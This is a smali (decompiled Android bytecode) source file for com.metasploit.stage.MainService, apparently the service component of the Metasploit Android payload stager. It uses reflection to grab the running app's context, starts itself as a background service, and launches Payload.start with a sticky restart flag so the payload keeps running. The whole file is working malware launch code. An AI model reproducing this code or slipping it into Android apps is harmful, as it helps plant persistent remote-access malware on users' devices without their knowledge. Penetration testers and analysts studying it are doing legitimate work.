.class public Lcom/metasploit/stage/MainService;
.super Landroid/app/Service;


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static start()V
    .registers 3

    :try_start_0
    const-string v0, "android.app.ActivityThread"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_5
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_5} :catch_31
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_5} :catch_2f

    move-result-object v0

    :try_start_6
    const-string v1, "currentApplication"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v0, 0x0

    const/4 v2, 0x0

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/Context;

    if-nez v0, :cond_2b

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lcom/metasploit/stage/c;

    invoke-direct {v2, v1}, Lcom/metasploit/stage/c;-><init>(Ljava/lang/reflect/Method;)V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_2a
    return-void

    :cond_2b
    invoke-static {v0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V
    :try_end_2e
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_2e} :catch_2f

    goto :goto_2a

    :catch_2f
    move-exception v0

    goto :goto_2a

    :catch_31
    move-exception v0

    goto :goto_2a
.end method

.method public static startService(Landroid/content/Context;)V
    .registers 3

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/metasploit/stage/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method
